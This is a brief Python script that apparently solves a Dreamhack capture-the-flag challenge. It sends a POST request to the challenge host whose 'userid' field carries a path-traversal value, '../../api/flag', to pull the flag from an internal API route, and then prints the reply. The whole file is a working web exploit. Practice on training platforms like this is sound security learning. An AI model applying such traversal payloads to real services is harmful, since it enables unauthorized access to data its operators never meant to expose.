




import requests

HOST = "http://host8.dreamhack.games:23725/get_info"

DATA = {
    "userid":"../../api/flag"
}

r = requests.post(url=HOST, data=DATA)
print(r.text)


